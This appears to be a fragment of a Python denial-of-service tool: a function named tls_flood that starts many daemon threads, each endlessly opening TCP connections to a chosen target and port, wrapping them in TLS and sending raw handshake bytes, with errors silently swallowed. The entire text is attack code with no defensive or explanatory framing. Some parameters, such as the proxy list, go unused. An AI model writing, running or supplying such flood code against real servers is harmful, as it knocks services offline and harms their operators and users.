def tls_flood(target, port, requests, threads, proxy_list):
    import threading, socket, ssl

    def flood():
        context = ssl.create_default_context()
        while True:
            try:
                with socket.create_connection((target, port), timeout=3) as sock:
                    with context.wrap_socket(sock, server_hostname=target):
                        sock.send(b'\x16\x03\x01')
            except:
                pass

    print(f"[TLS] Handshake flood to {target}:{port}")
    for _ in range(threads):
        t = threading.Thread(target=flood)
        t.daemon = True
        t.start()
